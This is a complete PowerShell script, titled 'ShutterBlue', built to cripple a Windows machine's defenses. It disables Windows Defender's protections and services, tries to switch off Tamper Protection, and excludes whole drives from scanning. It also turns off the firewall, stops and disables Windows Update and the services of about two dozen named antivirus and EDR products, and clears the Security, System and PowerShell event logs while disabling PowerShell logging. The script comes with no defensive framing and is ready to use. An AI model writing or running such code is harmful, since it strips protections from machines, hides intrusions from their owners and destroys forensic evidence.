$ErrorActionPreference = 'SilentlyContinue'
Set-StrictMode -Off

$ok  = '[+]'; $fail = '[-]'; $inf = '[*]'; $warn = '[!]'

function Try-Action {
    param([string]$Label, [scriptblock]$Action)
    try {
        & $Action
        Write-Host "$ok $Label" -ForegroundColor Green
        return $true
    } catch {
        Write-Host "$fail $Label : $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

function Stop-TargetService {
    param([string]$Name)
    $svc = Get-Service -Name $Name -ErrorAction SilentlyContinue
    if (-not $svc) { return 'notfound' }
    if ($svc.Status -eq 'Stopped') { return 'alreadystopped' }
    try {
        Stop-Service -Name $Name -Force -ErrorAction Stop
        Start-Sleep -Milliseconds 500
        $svc.Refresh()
        if ($svc.Status -eq 'Stopped') { return 'stopped' }
        return 'failed'
    } catch { return 'failed' }
}

function Disable-TargetService {
    param([string]$Name)
    try {
        Set-Service -Name $Name -StartupType Disabled -ErrorAction Stop
        return $true
    } catch { return $false }
}

Write-Host ""
Write-Host "=== ShutterBlue ===" -ForegroundColor Cyan
Write-Host ""

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "$warn Not running as admin. Most actions will fail." -ForegroundColor Yellow
}

Write-Host ""
Write-Host "[ TAMPER PROTECTION ]" -ForegroundColor Yellow

$tamperOn = $false
try {
    $tp = (Get-MpComputerStatus -ErrorAction Stop).IsTamperProtected
    $tamperOn = $tp
    if ($tp) {
        Write-Host "$warn Tamper Protection is ON - Defender registry edits will be silently ignored" -ForegroundColor Yellow
        $tpReg = 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Features'
        Try-Action "Tamper Protection registry disable" {
            Set-ItemProperty -Path $tpReg -Name 'TamperProtection' -Value 4 -Type DWord -ErrorAction Stop
        }
    } else {
        Write-Host "$ok Tamper Protection is OFF" -ForegroundColor Green
    }
} catch {
    Write-Host "$inf Could not read Tamper Protection state" -ForegroundColor DarkGray
}

Write-Host ""
Write-Host "[ WINDOWS DEFENDER ]" -ForegroundColor Yellow

Try-Action "Disable real-time monitoring" {
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop
}
Try-Action "Disable script block logging" {
    Set-MpPreference -DisableScriptScanning $true -ErrorAction Stop
}
Try-Action "Disable IOAV protection" {
    Set-MpPreference -DisableIOAVProtection $true -ErrorAction Stop
}
Try-Action "Disable cloud protection" {
    Set-MpPreference -MAPSReporting Disabled -SubmitSamplesConsent NeverSend -ErrorAction Stop
}
Try-Action "Disable behavior monitoring" {
    Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction Stop
}
Try-Action "Disable block at first seen" {
    Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction Stop
}
Try-Action "Disable intrusion prevention" {
    Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction Stop
}
Try-Action "Add C:\ exclusion" {
    Add-MpPreference -ExclusionPath 'C:\' -ErrorAction Stop
}
Try-Action "Add D:\ exclusion" {
    Add-MpPreference -ExclusionPath 'D:\' -ErrorAction Stop
}

Write-Host ""
Write-Host "[ DEFENDER REGISTRY KEYS ]" -ForegroundColor Yellow

$defRegPaths = @(
    @{ Path='HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender';              Name='DisableAntiSpyware';     Val=1 },
    @{ Path='HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender';              Name='DisableAntiVirus';       Val=1 },
    @{ Path='HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection'; Name='DisableRealtimeMonitoring'; Val=1 },
    @{ Path='HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection'; Name='DisableBehaviorMonitoring'; Val=1 },
    @{ Path='HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection'; Name='DisableOnAccessProtection'; Val=1 },
    @{ Path='HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection'; Name='DisableScanOnRealtimeEnable'; Val=1 },
    @{ Path='HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet';       Name='SpynetReporting';        Val=0 },
    @{ Path='HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet';       Name='SubmitSamplesConsent';   Val=2 }
)

foreach ($r in $defRegPaths) {
    Try-Action "Registry: $($r.Name)" {
        if (-not (Test-Path $r.Path)) { New-Item -Path $r.Path -Force | Out-Null }
        Set-ItemProperty -Path $r.Path -Name $r.Name -Value $r.Val -Type DWord -ErrorAction Stop
    }
}

Write-Host ""
Write-Host "[ DEFENDER SERVICE ]" -ForegroundColor Yellow

foreach ($svc in @('WinDefend','SecurityHealthService','wscsvc','Sense')) {
    $res = Stop-TargetService $svc
    switch ($res) {
        'stopped'      { Write-Host "$ok Stopped : $svc" -ForegroundColor Green }
        'alreadystopped' { Write-Host "$inf Already stopped : $svc" -ForegroundColor DarkGray }
        'notfound'     { Write-Host "$inf Not found : $svc" -ForegroundColor DarkGray }
        'failed'       { Write-Host "$fail Could not stop : $svc (PPL-protected or Tamper Protection)" -ForegroundColor Red }
    }
    Disable-TargetService $svc | Out-Null
}

Write-Host ""
Write-Host "[ WINDOWS FIREWALL ]" -ForegroundColor Yellow

Try-Action "Disable all firewall profiles (Set-NetFirewallProfile)" {
    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False -ErrorAction Stop
}

Try-Action "Disable firewall via netsh (fallback)" {
    netsh advfirewall set allprofiles state off 2>&1 | Out-Null
}

Try-Action "Disable firewall via registry" {
    $fwBase = 'HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy'
    foreach ($prof in @('DomainProfile','StandardProfile','PublicProfile')) {
        Set-ItemProperty -Path "$fwBase\$prof" -Name 'EnableFirewall' -Value 0 -Type DWord -ErrorAction Stop
    }
}

Write-Host ""
Write-Host "[ WINDOWS UPDATE / SIGNATURE ]" -ForegroundColor Yellow

foreach ($svc in @('wuauserv','BITS','UsoSvc','WaaSMedicSvc')) {
    $res = Stop-TargetService $svc
    switch ($res) {
        'stopped'        { Write-Host "$ok Stopped : $svc" -ForegroundColor Green }
        'alreadystopped' { Write-Host "$inf Already stopped : $svc" -ForegroundColor DarkGray }
        'notfound'       { Write-Host "$inf Not found : $svc" -ForegroundColor DarkGray }
        'failed'         { Write-Host "$fail Could not stop : $svc" -ForegroundColor Red }
    }
    Disable-TargetService $svc | Out-Null
}

Write-Host ""
Write-Host "[ THIRD-PARTY AV / EDR ]" -ForegroundColor Yellow

$thirdParty = @(
    @{ Label='CrowdStrike Falcon';   Services=@('CSFalconService','CsFalconContainer','CSAgent') },
    @{ Label='SentinelOne';          Services=@('SentinelAgent','SentinelStaticEngine','LogProcessorService') },
    @{ Label='Carbon Black';         Services=@('CarbonBlack','cbdefense','CbDefense','cbstream') },
    @{ Label='Cylance';              Services=@('CylanceSvc','CylanceUI') },
    @{ Label='Symantec/SEP';         Services=@('SepMasterService','ccSvcHst','Symantec AntiVirus','SmcService') },
    @{ Label='McAfee';               Services=@('McShield','mfewc','McAfeeFramework','masvc','mfemms') },
    @{ Label='Trend Micro';          Services=@('TMBMSRV','tmproxy','TmCCSF','ntrtscan') },
    @{ Label='Kaspersky';            Services=@('AVP','klnagent','AVP19.0.0','KAVFSGT') },
    @{ Label='ESET';                 Services=@('ekrn','EHttpSrv','EraAgentSvc') },
    @{ Label='Bitdefender';          Services=@('bdredline','bdagent','EPSecurityService','EPUpdateService') },
    @{ Label='Sophos';               Services=@('SAVService','SophosFIM','SophosHealth','Sophos MCS Agent','swi_service') },
    @{ Label='Webroot';              Services=@('WRSVC','WRCoreService') },
    @{ Label='Avast';                Services=@('AvastSvc','aswbIDSAgent','aswEngSrv') },
    @{ Label='AVG';                  Services=@('AVGSvc','avgfws') },
    @{ Label='Malwarebytes';         Services=@('MBAMService','MbaService') },
    @{ Label='F-Secure';             Services=@('F-Secure Gatekeeper Handler Starter','FSMA','fsbts') },
    @{ Label='Panda';                Services=@('PSANToManager','NanoServiceMain') },
    @{ Label='Comodo';               Services=@('cmdagent','CmdVirth') },
    @{ Label='Cortex XDR';           Services=@('cyserver','CortexXDR') },
    @{ Label='Elastic/Endgame';      Services=@('ElasticEndpoint','elastic-endpoint') },
    @{ Label='Cybereason';           Services=@('CybereasonActiveProbe','CybereasonBlocki') },
    @{ Label='FireEye/Trellix';      Services=@('xagt','femonitor','hx_tdi') },
    @{ Label='Qualys';               Services=@('QualysAgent') },
    @{ Label='Tanium';               Services=@('Tanium Client') }
)

foreach ($vendor in $thirdParty) {
    $found = $false
    foreach ($svcName in $vendor.Services) {
        $svc = Get-Service -Name $svcName -ErrorAction SilentlyContinue
        if (-not $svc) { continue }
        $found = $true
        Write-Host "$warn FOUND: $($vendor.Label) [$svcName] - Status: $($svc.Status)" -ForegroundColor Magenta
        $res = Stop-TargetService $svcName
        switch ($res) {
            'stopped'        { Write-Host "$ok  Stopped : $svcName" -ForegroundColor Green;     Disable-TargetService $svcName | Out-Null }
            'alreadystopped' { Write-Host "$inf Already stopped : $svcName" -ForegroundColor DarkGray }
            'failed'         { Write-Host "$fail Could not stop : $svcName (may have watchdog)" -ForegroundColor Red }
        }
    }
}

Write-Host ""
Write-Host "[ EVENT LOGS ]" -ForegroundColor Yellow

Try-Action "Stop EventLog service" {
    Stop-Service -Name 'EventLog' -Force -ErrorAction Stop
}

foreach ($log in @('Security','System','Application','Microsoft-Windows-PowerShell/Operational')) {
    Try-Action "Clear log: $log" {
        wevtutil cl "$log" 2>&1 | Out-Null
    }
}

Try-Action "Disable PowerShell script block logging (registry)" {
    $psLogPath = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'
    if (-not (Test-Path $psLogPath)) { New-Item -Path $psLogPath -Force | Out-Null }
    Set-ItemProperty -Path $psLogPath -Name 'EnableScriptBlockLogging' -Value 0 -Type DWord -ErrorAction Stop
}

Try-Action "Disable PowerShell module logging (registry)" {
    $psModPath = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging'
    if (-not (Test-Path $psModPath)) { New-Item -Path $psModPath -Force | Out-Null }
    Set-ItemProperty -Path $psModPath -Name 'EnableModuleLogging' -Value 0 -Type DWord -ErrorAction Stop
}

Write-Host ""
Write-Host "=== Done ===" -ForegroundColor Cyan
